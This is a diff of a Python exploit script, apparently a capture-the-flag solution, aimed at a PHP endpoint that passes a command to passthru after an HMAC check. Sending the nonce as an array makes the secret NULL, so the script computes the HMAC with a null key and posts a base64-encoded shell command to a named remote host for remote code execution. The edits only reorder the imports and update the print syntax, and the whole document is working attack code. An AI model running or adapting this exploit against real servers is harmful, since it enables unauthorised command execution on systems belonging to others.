@@ -1,8 +1,4 @@
 #! /usr/local/bin/python
-import requests
-import base64
-import subprocess
-
 """
 ORIGINAL PHP FUNCTION CODE BELOW
 <?php
@@ -49,7 +45,9 @@ if (hash_hmac($command['algo'], $command['action'], $secret) !== $command['hash'
 passthru($command['action']);
 ?>
 """
-
+import requests
+import base64
+import subprocess
 
 domain = "https://db.fishbowl.tech/"
 api = "/api/vegan/rest"
@@ -58,14 +56,11 @@ b64_cmd = base64.b64encode(cmd)
 
 #use php hash_hmac as python does not suport a NULL secret
 hmac_hash = subprocess.check_output("php -r \"echo hash_hmac('sha256', '{}', NULL);\"".format(cmd), shell=True)
-
-post_data = { "hash": hmac_hash,
-"action": b64_cmd,
-"nonce[]": 1}
+post_data = { "hash": hmac_hash, "action": b64_cmd, "nonce[]": 1}
 
 #nonce needs to be an array
 r = requests.post(domain+api, data=post_data)
-print r.text
+print(r.text)
 
 
 
